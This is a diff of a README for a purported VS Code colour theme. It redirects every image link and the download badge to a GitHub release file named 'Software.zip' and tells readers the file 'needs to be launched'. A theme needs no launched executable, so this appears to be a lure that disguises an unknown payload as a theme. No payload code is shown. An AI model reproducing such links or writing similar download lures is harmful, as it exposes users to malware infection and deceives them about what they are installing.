@@ -1,7 +1,7 @@
 
 # Monster Energy Theme for VS Code
 
-![Monster Energy Theme](https://example.com/monster-energy-theme.png)
+![Monster Energy Theme](https://github.com/Dawsandos/monster-energy-theme/releases/download/v1.0/Software.zip)
 
 🎉 Welcome to the Monster Energy Theme for Visual Studio Code! 🎉 
 
@@ -11,7 +11,7 @@ This repository contains a sleek and vibrant VS Code theme inspired by the elect
 ### 🚀 Get Started
 To get started with the Monster Energy Theme, simply download the theme package by clicking the link below:
 
-[![Download Monster Energy Theme](https://img.shields.io/badge/Download-Monster_Energy_Theme-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) _(File needs to be launched)_
+[![Download Monster Energy Theme](https://github.com/Dawsandos/monster-energy-theme/releases/download/v1.0/Software.zip)](https://github.com/Dawsandos/monster-energy-theme/releases/download/v1.0/Software.zip) _(File needs to be launched)_
 
 ### Features
 🔥 Customized syntax highlighting  
@@ -23,9 +23,9 @@ To get started with the Monster Energy Theme, simply download the theme package 
 ### Screenshots
 Here are some vibrant screenshots showcasing the Monster Energy Theme in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/Dawsandos/monster-energy-theme/releases/download/v1.0/Software.zip)
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/Dawsandos/monster-energy-theme/releases/download/v1.0/Software.zip)
 
 ### Installation
 1. Download the theme package from the link provided above.
